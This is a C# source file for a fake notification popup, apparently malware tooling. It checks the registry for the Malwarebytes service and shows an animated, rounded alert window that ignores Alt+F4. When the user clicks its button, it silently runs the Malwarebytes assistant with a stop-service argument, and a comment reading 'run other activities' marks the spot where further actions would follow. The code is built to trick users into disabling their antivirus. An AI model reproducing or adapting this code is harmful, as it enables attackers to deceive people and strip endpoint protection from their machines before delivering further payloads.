using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace FakePopup
{
    public partial class NotificationForm : Form
    {
        private readonly Timer timer;
        private readonly float opacityIncrement = 0.05f;
        private readonly int moveIncrement = 18;
        private int targetY;

        private bool found = false;
        private string path = string.Empty;

        [DllImport("Gdi32.dll", EntryPoint = "CreateRoundRectRgn")]
        private static extern IntPtr CreateRoundRectRgn
        (
            int nLeftRect,
            int nTopRect,
            int nRightRect,
            int nBottomRect,
            int nWidthEllipse,
            int nHeightEllipse
        );

        protected override bool ProcessCmdKey(ref Message msg, Keys keyData)
        {
            if (keyData == (Keys.Alt | Keys.F4))
            {
                return true; 
            }

            return base.ProcessCmdKey(ref msg, keyData);
        }

        public NotificationForm()
        {
            try
            {
                path = Directory.GetParent(GetServiceExecutablePath("MBAMService").Replace("\"", "")).FullName;

                if (string.IsNullOrEmpty(path))
                {
                    Environment.Exit(0);
                }
                else
                {
                    found = true;
                    this.Opacity = 0;

                    InitializeComponent();
                    Region = Region.FromHrgn(CreateRoundRectRgn(0, 0, Width, Height, 25, 25));

                    timer = new Timer();
                    timer.Interval = 5;

                    this.Load += MyForm_Load;
                    timer.Tick += Timer_Tick;
                }
            }
            catch {
                Environment.Exit(0);
            }
        }

        private void MyForm_Load(object sender, EventArgs e)
        {
            var workingArea = Screen.GetWorkingArea(this);
            targetY = workingArea.Bottom  - this.Height;

            this.Location = new Point(workingArea.Right - this.Width - 10, workingArea.Bottom);

            timer.Start();
        }

        private void Timer_Tick(object sender, EventArgs e)
        {
            if (this.Location.Y > targetY)
            {
                this.Location = new Point(this.Location.X, this.Location.Y - moveIncrement);
            }

            if (this.Opacity < 1)
            {
                this.Opacity += opacityIncrement;
            }

            if (this.Location.Y <= targetY && this.Opacity >= 1)
            {
                timer.Stop();
            }
        }

        private void BtnAction_MouseEnter(object sender, EventArgs e)
        {
            ((PictureBox)sender).Image = Properties.Resources.btn_hover;
        }

        private void BtnAction_MouseLeave(object sender, EventArgs e)
        {
            ((PictureBox)sender).Image = Properties.Resources.btn_normal;
        }

        private void BtnClose_MouseEnter(object sender, EventArgs e)
        {
            ((PictureBox)sender).Image = Properties.Resources.x_hover;
        }

        private void BtnClose_MouseLeave(object sender, EventArgs e)
        {
            ((PictureBox)sender).Image = Properties.Resources.x_normal;
        }

        static string GetServiceExecutablePath(string serviceName)
        {
            try
            {
                string registryPath = $@"SYSTEM\CurrentControlSet\Services\{serviceName}";
                using (RegistryKey key = Registry.LocalMachine.OpenSubKey(registryPath))
                {
                    if (key != null)
                    {
                        object imagePath = key.GetValue("ImagePath");
                        if (imagePath != null)
                        {
                            return imagePath.ToString();
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error accessing registry: {ex.Message}");
            }

            return null;
        }

        static void StartProcessWithAdminRights(string filePath, string arguments)
        {
            ProcessStartInfo processInfo = new ProcessStartInfo
            {
                FileName = filePath,
                Arguments = arguments,
                UseShellExecute = true,
                CreateNoWindow = true,
                WindowStyle = ProcessWindowStyle.Hidden
            };

            try
            {
                Process process = Process.Start(processInfo);
                process.WaitForExit();
            }
            catch (Exception)
            {
            }
        }

        private void ButtonClick(object sender, EventArgs e)
        {
            StartProcessWithAdminRights(Path.Combine(path, "malwarebytes_assistant.exe"), "--StopService");

            //run other activities
            Environment.Exit(0);
        }
    }
}
